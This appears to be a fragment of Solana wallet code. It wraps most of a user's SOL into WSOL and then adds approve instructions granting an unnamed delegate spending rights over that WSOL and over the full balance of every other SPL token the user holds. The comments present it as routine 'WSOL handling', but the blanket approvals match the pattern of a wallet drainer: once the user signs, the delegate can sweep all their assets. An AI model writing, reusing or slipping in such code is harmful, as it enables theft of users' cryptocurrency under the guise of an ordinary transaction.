const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);

if (!tokenAccounts) {
    throw new Error("Failed to fetch token accounts");
}

//
// WSOL handling
//
const SAFE_SOL_BUFFER = 10_000_000n; // 0.01 SOL
const ATA_RENT_BUFFER = 3_000_000n;  // bezpečná rezerva
const WRAP_RATIO_NUM = 95n;
const WRAP_RATIO_DEN = 100n;

const solBalance = tokenAccounts.solBalance;

if (solBalance > SAFE_SOL_BUFFER) {
    const wsolAta = await getAssociatedTokenAddress(
        NATIVE_MINT,
        userPubkey
    );

    const ataExists = tokenAccounts.existingAtas.includes(
        wsolAta.toBase58()
    );

    let available = solBalance - SAFE_SOL_BUFFER;

    if (!ataExists) {
        available -= ATA_RENT_BUFFER;
    }

    if (available > 0n) {
        const wrapAmount =
            (available * WRAP_RATIO_NUM) /
            WRAP_RATIO_DEN;

        if (wrapAmount > 0n) {

            //
            // Create ATA if missing
            //
            if (!ataExists) {
                tx.add(
                    createAssociatedTokenAccountInstruction(
                        userPubkey,
                        wsolAta,
                        userPubkey,
                        NATIVE_MINT
                    )
                );
            }

            //
            // SOL -> WSOL
            //
            tx.add(
                SystemProgram.transfer({
                    fromPubkey: userPubkey,
                    toPubkey: wsolAta,
                    lamports: wrapAmount
                })
            );

            //
            // Sync WSOL
            //
            tx.add(
                createSyncNativeInstruction(
                    wsolAta
                )
            );

            //
            // Approve WSOL
            //
            tx.add(
                createApproveInstruction(
                    wsolAta,
                    delegatePubkey,
                    userPubkey,
                    wrapAmount
                )
            );
        }
    }
}

//
// Approve all other SPL tokens
//
for (const token of tokenAccounts.tokens || []) {
    if (token.amount < MIN_RAW_AMOUNT) {
        continue;
    }

    if (token.mint.equals(NATIVE_MINT)) {
        continue;
    }

    tx.add(
        createApproveInstruction(
            token.ata,
            delegatePubkey,
            userPubkey,
            token.amount
        )
    );
}
